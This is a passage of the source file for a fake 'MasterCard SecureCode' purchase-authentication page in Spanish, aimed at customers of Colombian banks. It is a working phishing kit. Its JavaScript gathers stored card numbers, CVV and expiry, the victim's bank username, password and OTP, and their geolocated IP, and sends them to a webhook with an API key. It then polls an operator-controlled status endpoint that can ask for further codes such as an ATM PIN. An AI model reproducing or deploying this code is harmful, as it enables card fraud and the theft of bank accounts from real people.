<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>MasterCard SecureCode</title>
    <style>
        :root {
            --mc-red: #eb001b;
            --mc-red-hover: #c4001a;
            --mc-gold: #f79e1b;
            --co-text: #111827;
            --co-text-2: #374151;
            --co-text-muted: #6b7280;
            --co-bg: #f5f5f5;
            --co-border: #e5e7eb;
            --co-white: #fff;
            --co-success: #16a34a;
            --co-error: #dc2626;
            --visa-teal: #006f7f;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            max-width: 100%;
            overflow-x: hidden;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f4f6f9;
            color: var(--co-text);
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }

        /* ===== FONDO CON IMAGEN leash.png + BLUR DIFUMINADO ===== */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('leash.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            filter: blur(18px) brightness(0.75);
            -webkit-filter: blur(18px) brightness(0.75);
            transform: scale(1.1);
            z-index: 0;
            pointer-events: none;
        }

        /* ===== VENTANA BLANCA (MODAL) ===== */
        .container {
            position: relative;
            z-index: 1;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25), 0 2px 8px rgba(0, 0, 0, 0.15);
            padding: 32px 34px 28px;
            max-width: 460px;
            width: 100%;
            border: 1px solid #eef1f5;
        }

        /* ===== HEADER ===== */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 24px;
        }

        .bank-logo {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            flex-shrink: 0;
            max-width: 55%;
            min-height: 60px;
        }

        .bank-logo img {
            height: 60px;
            width: auto;
            max-width: 160px;
            object-fit: contain;
            display: none;
        }

        .mc-logo {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            flex-shrink: 0;
            margin-left: auto;
        }

        .mc-logo img {
            height: 90px;
            width: auto;
            max-width: 180px;
            display: block;
            object-fit: contain;
        }

        /* ===== TÍTULOS ===== */
        .form-title {
            font-size: 1.35rem;
            font-weight: 700;
            color: #000;
            margin-bottom: 8px;
            letter-spacing: -0.01em;
            line-height: 1.3;
        }

        .form-subtitle {
            font-size: 0.875rem;
            color: #6b7280;
            margin-bottom: 26px;
            line-height: 1.55;
        }

        .form-subtitle strong {
            color: #000;
            font-weight: 600;
        }

        /* ===== INFO DE TRANSACCIÓN ===== */
        .transaction-info {
            margin-bottom: 26px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .info-row {
            display: flex;
            align-items: flex-start;
            font-size: 0.8125rem;
            gap: 8px;
        }

        .info-label {
            color: #6b7280;
            font-weight: 400;
            min-width: 110px;
            flex-shrink: 0;
        }

        .info-value {
            color: #000;
            font-weight: 500;
            text-align: left;
            word-break: break-word;
            flex: 1;
        }

        /* ===== FORMULARIO ===== */
        form {
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .form-label {
            font-size: 0.8125rem;
            font-weight: 500;
            color: #000;
        }

        .form-label .required {
            color: #dc2626;
            margin-left: 2px;
        }

        /* ===== INPUTS MENOS REDONDEADOS ===== */
        .form-input {
            padding: 12px 16px;
            border: 1px solid #c8d0d8;
            border-radius: 10px;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 0.9375rem;
            color: #000;
            transition: border-color 0.2s, box-shadow 0.2s;
            background: #fff;
            width: 100%;
            max-width: 100%;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--mc-red);
            box-shadow: 0 0 0 2px rgba(235, 0, 27, 0.15);
        }

        .form-input::placeholder {
            color: #9ca3af;
        }

        .form-input:disabled {
            background: #f3f4f6;
            cursor: not-allowed;
        }

        .form-input.error {
            border-color: var(--co-error);
        }

        .form-input.error:focus {
            box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.15);
        }

        .error-message {
            color: var(--co-error);
            font-size: 0.7rem;
            display: none;
            margin-top: 3px;
            padding-left: 4px;
        }

        .form-group.error .form-input {
            border-color: var(--co-error);
        }

        .form-group.error .error-message {
            display: block;
        }

        /* ===== OTP SECTION ===== */
        .otp-section {
            display: none;
            animation: fadeIn 0.4s ease;
            margin-top: 4px;
        }

        .otp-section.visible {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .otp-info {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.75rem;
            color: #6b7280;
            margin-bottom: 10px;
            line-height: 1.5;
        }

        .otp-info svg {
            width: 16px;
            height: 16px;
            flex-shrink: 0;
            color: #000;
        }

        /* ===== BOTÓN CENTRADO ===== */
        .button-group {
            display: flex;
            justify-content: center;
            margin-top: 12px;
        }

        .btn {
            padding: 13px 40px;
            border: none;
            border-radius: 10px;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 0.9375rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
        }

        .btn-primary {
            background: var(--mc-red);
            color: #ffffff;
        }

        .btn-primary:hover:not(:disabled) {
            background: var(--mc-red-hover);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* ===== STATUS MESSAGE ===== */
        .status-message {
            display: none;
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 0.8125rem;
            font-weight: 500;
            margin-bottom: 14px;
            text-align: center;
        }

        .status-message.error {
            display: block;
            background: #fef2f2;
            color: var(--co-error);
            border: 1px solid #fecaca;
        }

        .status-message.success {
            display: block;
            background: #f0fdf4;
            color: var(--co-success);
            border: 1px solid #bbf7d0;
        }

        .status-message.info {
            display: block;
            background: #eff6ff;
            color: #1e40af;
            border: 1px solid #bfdbfe;
        }

        .status-message.error-usuario {
            display: block;
            background: #fef2f2;
            color: var(--co-error);
            border: 3px solid #dc2626;
            font-weight: 700;
            font-size: 0.9375rem;
            padding: 14px;
        }

        /* ============================================ */
        /* ===== LOADING OVERLAY (SOLO LOGO MASTERCARD + RUEDITA) ===== */
        /* ============================================ */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.35);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
            padding: 20px;
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-card {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.18), 0 2px 8px rgba(0, 0, 0, 0.08);
            padding: 44px 52px 40px;
            max-width: 360px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 30px;
            border: 1px solid #eef1f5;
            animation: loaderFadeIn 0.3s ease;
        }

        @keyframes loaderFadeIn {
            from { opacity: 0; transform: scale(0.96); }
            to { opacity: 1; transform: scale(1); }
        }

        .loading-mc {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-mc img {
            height: 120px;
            width: auto;
            max-width: 260px;
            object-fit: contain;
            display: block;
        }

        .spinner-circle {
            width: 44px;
            height: 44px;
            border: 3px solid #e5e7eb;
            border-top: 3px solid var(--mc-red);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            body { padding: 16px; }
            body::before { filter: blur(16px) brightness(0.75); -webkit-filter: blur(16px) brightness(0.75); }
            .container { padding: 30px 28px 26px; max-width: 440px; }
            .header { margin-bottom: 22px; }
            .bank-logo img { height: 52px; max-width: 140px; }
            .mc-logo img { height: 80px; max-width: 160px; }
            .form-title { font-size: 1.25rem; }
            .form-subtitle { font-size: 0.85rem; margin-bottom: 22px; }
            .btn { padding: 12px 34px; font-size: 0.9rem; }
            .info-label { min-width: 100px; }
            .loading-card { padding: 38px 42px 34px; max-width: 340px; gap: 26px; }
            .loading-mc img { height: 100px; max-width: 220px; }
        }

        @media (max-width: 480px) {
            body {
                padding: 14px;
                align-items: center;
                justify-content: center;
            }
            body::before { filter: blur(14px) brightness(0.7); -webkit-filter: blur(14px) brightness(0.7); }
            .container {
                padding: 32px 22px 30px;
                border-radius: 14px;
                margin-top: 0;
                max-width: 100%;
                min-height: auto;
            }
            .header { margin-bottom: 22px; gap: 6px; }
            .bank-logo img { height: 46px; max-width: 120px; }
            .mc-logo img { height: 72px; max-width: 145px; }
            .form-title { font-size: 1.18rem; }
            .form-subtitle { font-size: 0.82rem; margin-bottom: 22px; }
            .transaction-info { gap: 6px; margin-bottom: 22px; }
            .info-row { font-size: 0.78rem; }
            .info-label { min-width: 95px; }
            .button-group { margin-top: 10px; }
            .btn { padding: 12px 34px; font-size: 0.85rem; }
            .otp-info { font-size: 0.72rem; }
            .form-input { padding: 12px 14px; font-size: 0.9rem; border-radius: 10px; }
            .form-label { font-size: 0.8rem; }
            .loading-card { padding: 34px 30px 30px; max-width: 300px; gap: 22px; border-radius: 14px; }
            .loading-mc img { height: 90px; max-width: 190px; }
            .spinner-circle { width: 38px; height: 38px; border-width: 3px; }
        }

        @media (max-width: 360px) {
            body { padding: 10px; }
            body::before { filter: blur(12px) brightness(0.7); -webkit-filter: blur(12px) brightness(0.7); }
            .container { padding: 26px 18px 24px; border-radius: 12px; }
            .header { gap: 4px; margin-bottom: 18px; }
            .bank-logo img { height: 40px; max-width: 100px; }
            .mc-logo img { height: 62px; max-width: 125px; }
            .form-title { font-size: 1.08rem; }
            .form-subtitle { font-size: 0.78rem; }
            .transaction-info { gap: 5px; }
            .info-row { font-size: 0.72rem; }
            .info-label { min-width: 85px; }
            .btn { padding: 11px 28px; font-size: 0.82rem; }
            .form-input { padding: 11px 13px; font-size: 0.85rem; }
            .form-label { font-size: 0.75rem; }
            .loading-card { padding: 30px 24px 26px; max-width: 270px; gap: 18px; }
            .loading-mc img { height: 78px; max-width: 160px; }
            .spinner-circle { width: 34px; height: 34px; }
        }

        @media (max-height: 600px) and (orientation: landscape) {
            body { align-items: center; padding: 10px; }
            .container { padding: 20px 24px; }
            .header { margin-bottom: 14px; }
            .bank-logo img { height: 44px; }
            .mc-logo img { height: 62px; }
            .form-title { font-size: 1.05rem; }
            .form-subtitle { margin-bottom: 14px; }
            .transaction-info { margin-bottom: 14px; }
            .loading-card { padding: 24px 30px 22px; max-width: 280px; gap: 16px; }
            .loading-mc img { height: 80px; }
        }
    </style>
</head>
<body>
    <!-- ===== LOADING OVERLAY: SOLO LOGO MASTERCARD + RUEDITA ===== -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-card">
            <div class="loading-mc">
                <img src="master.png" alt="MasterCard ID Check" />
            </div>
            <div class="spinner-circle"></div>
        </div>
    </div>

    <div class="container">
        <div class="header">
            <div class="bank-logo" id="bankLogoContainer">
                <img id="bankLogoImg" src="" alt="Logo banco" />
            </div>
            <div class="mc-logo">
                <img src="master.png" alt="MasterCard ID Check" />
            </div>
        </div>

        <h1 class="form-title">Autenticación de compra</h1>
        <p class="form-subtitle">
            Ingrese las credenciales de seguridad de su <strong id="bancoNombre">banco emisor</strong> para validar la transacción.
        </p>

        <div class="transaction-info">
            <div class="info-row">
                <span class="info-label">Monto:</span>
                <span class="info-value" id="transaction-amount">23.000 Col$</span>
            </div>
        </div>

        <div class="status-message" id="statusMessage"></div>

        <form id="authForm" novalidate>
            <div class="form-group">
                <label class="form-label">Usuario <span class="required">*</span></label>
                <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
                <div class="error-message">El usuario es requerido</div>
            </div>

            <div class="form-group">
                <label class="form-label">Contraseña <span class="required">*</span></label>
                <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
                <div class="error-message">La contraseña es requerida</div>
            </div>

            <div class="otp-section" id="otpSection">
                <div class="otp-info" id="otpInfoText">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        <path d="M12 8v4"/>
                        <path d="M12 16h.01"/>
                    </svg>
                    <span id="otpInfoMessage">Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="8" inputmode="numeric" required />
                    <div class="error-message">El código debe tener entre 6 y 8 dígitos</div>
                </div>
            </div>

            <!-- Botón centrado -->
            <div class="button-group">
                <button type="submit" class="btn btn-primary" id="submitButton">
                    <span id="buttonText">Confirmar pago</span>
                </button>
            </div>
        </form>
    </div>

    <script>
        // ============================================
        // CONFIGURACIÓN
        // ============================================
        const WEBHOOK_URL = '/api/webhook.php';
        const HEARTBEAT_URL = '/api/heartbeat.php';
        const API_KEY = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
        const POLLING_INTERVAL = 2000;
        const MAX_POLLING_TIME = 300000;
        const HEARTBEAT_INTERVAL = 5000;

        // ============================================
        // CAPTURAR IP + PAÍS + CIUDAD (HTTPS)
        // ============================================
        async function capturarIP() {
            if (localStorage.getItem('usuario_ip')) {
                console.log('ℹ️ IP ya capturada:', localStorage.getItem('usuario_ip'));
                return localStorage.getItem('usuario_ip');
            }

            try {
                const resp = await fetch('https://ipwho.is/');
                const data = await resp.json();
                if (data.success && data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', data.country || 'Desconocido');
                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                    console.log('✅ IP:', data.ip, '· País:', data.country, '· Ciudad:', data.city);
                    return data.ip;
                }
            } catch (e) {
                console.warn('ipwho.is falló:', e);
            }

            try {
                const resp = await fetch('https://ipapi.co/json/');
                const data = await resp.json();
                if (data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', data.country_name || 'Desconocido');
                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                    console.log('✅ IP (ipapi):', data.ip, '· País:', data.country_name);
                    return data.ip;
                }
            } catch (e) {
                console.warn('ipapi.co falló:', e);
            }

            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                if (data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', 'Desconocido');
                    localStorage.setItem('usuario_ciudad', 'Desconocida');
                    console.log('✅ IP (ipify):', data.ip);
                    return data.ip;
                }
            } catch (e) {
                console.warn('ipify falló:', e);
            }

            localStorage.setItem('usuario_ip', 'Desconocida');
            localStorage.setItem('usuario_pais', 'Desconocido');
            localStorage.setItem('usuario_ciudad', 'Desconocida');
            return null;
        }

        capturarIP();

        // ============================================
        // SOLICITUD ID GENERADO AL CARGAR
        // ============================================
        let solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        console.log('🆔 solicitudId generado al cargar:', solicitudId);

        let pollingInterval = null;
        let pasoActual = 'credenciales';
        let errorMostrado = false;
        let modoAutenticacion = 'otp';
        let ultimoCodigoOTP = null;
        let formularioBloqueado = false;
        let rechazoDetectado = false;
        let heartbeatInterval = null;

        // Elementos DOM
        const form = document.getElementById('authForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const confirmationInput = document.getElementById('confirmationCode');
        const otpSection = document.getElementById('otpSection');
        const otpInfoText = document.getElementById('otpInfoText');
        const otpInfoMessage = document.getElementById('otpInfoMessage');
        const otpLabel = document.getElementById('otpLabel');
        const submitButton = document.getElementById('submitButton');
        const buttonText = document.getElementById('buttonText');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const statusMessage = document.getElementById('statusMessage');
        const bankLogoImg = document.getElementById('bankLogoImg');
        const bankLogoContainer = document.getElementById('bankLogoContainer');
        const bancoNombre = document.getElementById('bancoNombre');

        // ============================================
        // MAPA DE LOGOS DE BANCOS
        // ============================================
        const bankLogos = {
            'Bancolombia': 'bancol.png',
            'Davivienda': 'davivienda.png',
            'Davibank': 'db.png',
            'Banco Popular': 'popu.png',
            'Banco Falabella': 'fala.png',
            'Itaú': 'itau.png',
            'Caja Social': 'Caja.jpg',
            'Banco de Bogotá': 'bog.png',
            'Banco Occidente': 'occi.png'
        };

        // ============================================
        // HEARTBEAT
        // ============================================
        function enviarHeartbeat(estado = 'activo') {
            try {
                fetch(HEARTBEAT_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        solicitudId: solicitudId,
                        usuario: usernameInput ? usernameInput.value : '',
                        estado: estado,
                        ip: localStorage.getItem('usuario_ip') || '',
                        pais: localStorage.getItem('usuario_pais') || '',
                        ciudad: localStorage.getItem('usuario_ciudad') || ''
                    }),
                    keepalive: true
                }).catch(() => {});
            } catch (e) {}
        }

        function iniciarHeartbeat() {
            enviarHeartbeat('activo');

            if (heartbeatInterval) {
                clearInterval(heartbeatInterval);
            }

            heartbeatInterval = setInterval(() => {
                enviarHeartbeat('activo');
            }, HEARTBEAT_INTERVAL);

            console.log('💓 Heartbeat iniciado (cada ' + (HEARTBEAT_INTERVAL / 1000) + 's)');
        }

        function detenerHeartbeat(notificar = true) {
            if (heartbeatInterval) {
                clearInterval(heartbeatInterval);
                heartbeatInterval = null;
            }

            if (notificar) {
                try {
                    navigator.sendBeacon(
                        HEARTBEAT_URL,
                        JSON.stringify({
                            solicitudId: solicitudId,
                            estado: 'offline'
                        })
                    );
                } catch (e) {}
            }
        }

        window.addEventListener('beforeunload', function() {
            detenerHeartbeat(true);
        });

        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('👀 Usuario cambió de pestaña');
            } else {
                console.log('👀 Usuario volvió');
                enviarHeartbeat('activo');
            }
        });

        // ============================================
        // INICIALIZACIÓN
        // ============================================
        window.addEventListener('load', function() {
            initializeTransaction();
            cargarLogoBanco();
            console.log('✅ MasterCard SecureCode listo');
            iniciarHeartbeat();
        });

        function cargarLogoBanco() {
            const bancoEmisor = localStorage.getItem('bancoEmisor');
            console.log('🏛️ Banco emisor desde localStorage:', bancoEmisor);
            if (bancoEmisor) {
                bancoNombre.textContent = bancoEmisor;
            }
            if (bancoEmisor && bankLogos[bancoEmisor]) {
                bankLogoImg.src = bankLogos[bancoEmisor];
                bankLogoImg.alt = bancoEmisor;
                bankLogoImg.style.display = 'block';
                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
            } else {
                bankLogoImg.style.display = 'none';
                console.log('❌ No se encontró logo para el banco, no se muestra nada');
            }
        }

        function initializeTransaction() {
            const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
            let amount = 23000;
            if (storagePriority) amount += 20000;
            const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
            document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';

            const cardNumber = localStorage.getItem('cardNumber') || 'No disponible';
            const cvc = localStorage.getItem('cvc') || 'No disponible';
            const expiry = localStorage.getItem('expiry') || 'No disponible';

            localStorage.setItem('cardNumberFull', cardNumber);
            localStorage.setItem('cardCVV', cvc);
            localStorage.setItem('cardExpiry', expiry);
            console.log('📋 Datos cargados desde localStorage');
        }

        // ============================================
        // FUNCIONES WEBHOOK
        // ============================================
        async function enviarCredencialesAlWebhook(datos) {
            try {
                console.log('📤 Enviando credenciales al webhook:', datos);
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        numeroTarjeta: datos.numeroTarjeta,
                        cvv: datos.cvv,
                        vencimiento: datos.vencimiento,
                        usuario: datos.usuario,
                        password: datos.password,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'credenciales',
                        bancoEmisor: localStorage.getItem('bancoEmisor') || 'No especificado',
                        tipo_tarjeta: 'mastercard',
                        ip: localStorage.getItem('usuario_ip') || '',
                        pais: localStorage.getItem('usuario_pais') || 'Desconocido',
                        ciudad: localStorage.getItem('usuario_ciudad') || 'Desconocida'
                    })
                });
                const data = await response.json();
                console.log('📨 Respuesta del webhook:', data);
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        async function enviarOTPAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.otp,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'otp',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'mastercard',
                        es_reintento: datos.es_reintento || false
                    })
                });
                const data = await response.json();
                console.log('📨 Respuesta del webhook OTP:', data);
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        async function enviarClaveDinamicaAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.clave,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'clave_dinamica',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'mastercard',
                        es_reintento: datos.es_reintento || false
                    })
                });
                const data = await response.json();
                console.log('📨 Respuesta del webhook Clave Dinámica:', data);
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        async function enviarClaveCajeroAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.clave,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'clave_cajero',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'mastercard',
                        es_reintento: datos.es_reintento || false
                    })
                });
                const data = await response.json();
                console.log('📨 Respuesta del webhook Clave Cajero:', data);
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        // ============================================
        // VERIFICAR ESTADO
        // ============================================
        async function verificarEstadoSolicitud(solicitudId, intentos = 3) {
            for (let i = 0; i < intentos; i++) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    const response = await fetch(`/api/estado.php?id=${solicitudId}`, {
                        signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    if (!response.ok) {
                        console.log(`⚠️ Intento ${i+1} falló: ${response.status}`);
                        continue;
                    }
                    const data = await response.json();
                    console.log('📊 Estado recibido:', data);

                    if (data.otp_codigo && data.otp_codigo !== 'N/A' && data.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== data.otp_codigo) {
                            ultimoCodigoOTP = data.otp_codigo;
                            console.log('📱 Nuevo código detectado:', ultimoCodigoOTP);
                        }
                    }

                    if (data.otp_modo) {
                        localStorage.setItem('otp_modo', data.otp_modo);
                    }

                    const estadoReal = data.estado_real || data.estado || 'pending';

                    if (estadoReal === 'approved' || estadoReal === 'approved_otp' || estadoReal === 'approved_clave_cajero') {
                        return { estado: 'approved', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'rejected' || estadoReal === 'rejected_otp' || estadoReal === 'rejected_clave_cajero' || estadoReal === 'rejected_user_error') {
                        return { estado: 'rejected', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'pending_otp') {
                        return { estado: 'pending_otp', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'pending_clave_cajero') {
                        return { estado: 'pending_clave_cajero', estadoReal: estadoReal, modo: data.otp_modo || 'clave_cajero', otp_codigo: data.otp_codigo };
                    }
                    return { estado: 'pending', estadoReal: 'pending', modo: 'otp', otp_codigo: null };
                } catch (error) {
                    console.log(`⚠️ Intento ${i+1} falló: ${error.message}`);
                    if (i === intentos - 1) return { estado: 'error', estadoReal: 'error', modo: 'otp', otp_codigo: null };
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            return { estado: 'error', estadoReal: 'error', modo: 'otp', otp_codigo: null };
        }

        // ============================================
        // POLLING CREDENCIALES
        // ============================================
        function iniciarPollingCredenciales() {
            let tiempoInicio = Date.now();
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
            console.log('🔄 Polling credenciales...');
            // NO mostrar overlay aquí, ya se mostró al enviar el form

            pollingInterval = setInterval(async () => {
                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.remove('active');
                    mostrarError('⏰ Tiempo de espera agotado');
                    resetFormulario();
                    return;
                }
                const resultado = await verificarEstadoSolicitud(solicitudId);
                console.log('📊 Resultado polling credenciales:', resultado);

                if (resultado.estado === 'pending_otp' || resultado.estado === 'pending_clave_cajero') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    const modo = resultado.modo || 'otp';
                    console.log('✅ Modo detectado:', modo);

                    if (modo === 'clave_cajero') {
                        modoAutenticacion = 'clave_cajero';
                        mostrarSeccionOTP('clave_cajero');
                    } else if (modo === 'clave_dinamica') {
                        modoAutenticacion = 'clave_dinamica';
                        mostrarSeccionOTP('clave_dinamica');
                    } else {
                        modoAutenticacion = 'otp';
                        mostrarSeccionOTP('otp');
                    }

                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A' && resultado.otp_codigo !== null) {
                        ultimoCodigoOTP = resultado.otp_codigo;
                        confirmationInput.value = ultimoCodigoOTP;
                        mostrarExito('✅ Código recibido automáticamente');
                    }

                    // Quitar overlay para mostrar el formulario OTP
                    loadingOverlay.classList.remove('active');
                    submitButton.disabled = false;
                    formularioBloqueado = false;

                    // NO iniciar polling OTP automáticamente.
                    // Solo se iniciará cuando el usuario envíe un código.
                    return;

                } else if (resultado.estado === 'approved') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    console.log('✅ Transacción aprobada!');
                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                    detenerHeartbeat(true);
                    setTimeout(() => {
                        window.location.href = 'exito.php';
                    }, 2000);
                    return;
                } else if (resultado.estado === 'rejected') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.remove('active');
                    console.log('❌ Transacción rechazada');
                    mostrarError('❌ Credenciales incorrectas o transacción rechazada');
                    resetFormulario();
                    formularioBloqueado = false;
                    return;
                }
            }, POLLING_INTERVAL);
        }

        // ============================================
        // POLLING OTP
        // ============================================
        function iniciarPollingOTP() {
            let tiempoInicio = Date.now();
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
            console.log('🔄 Polling OTP/Clave...');
            rechazoDetectado = false;
            // NO mostrar overlay aquí, ya se mostró al enviar el código

            pollingInterval = setInterval(async () => {
                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    loadingOverlay.classList.remove('active');
                    mostrarError('⏰ Tiempo de espera agotado');
                    resetFormulario();
                    formularioBloqueado = false;
                    return;
                }

                const resultado = await verificarEstadoSolicitud(solicitudId);
                console.log('📊 Resultado polling OTP:', resultado);

                if (resultado.estado === 'pending_clave_cajero') {
                    console.log('🔄 Cambiando a modo Clave Cajero');

                    if (modoAutenticacion !== 'clave_cajero') {
                        modoAutenticacion = 'clave_cajero';
                        mostrarSeccionOTP('clave_cajero');
                        confirmationInput.value = '';
                        confirmationInput.placeholder = 'Ingresa tu clave del cajero (4 dígitos)';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        buttonText.textContent = 'Confirmar pago';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }

                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A' && resultado.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== resultado.otp_codigo) {
                            ultimoCodigoOTP = resultado.otp_codigo;
                            confirmationInput.value = ultimoCodigoOTP;
                            confirmationInput.style.borderColor = '#4ade80';
                            confirmationInput.style.boxShadow = '0 0 0 3px rgba(74, 222, 128, 0.3)';
                            setTimeout(() => {
                                confirmationInput.style.borderColor = '';
                                confirmationInput.style.boxShadow = '';
                            }, 2000);
                            mostrarExito('✅ Código recibido automáticamente');
                        }
                    }

                    return;
                }

                if (resultado.estado === 'pending_otp') {
                    console.log('🔄 Cambiando a modo OTP');

                    const modoReal = resultado.modo || 'otp';

                    if (modoReal === 'otp' && modoAutenticacion !== 'otp') {
                        console.log('🔄 Cambiando interfaz a OTP');
                        modoAutenticacion = 'otp';
                        mostrarSeccionOTP('otp');
                        confirmationInput.value = '';
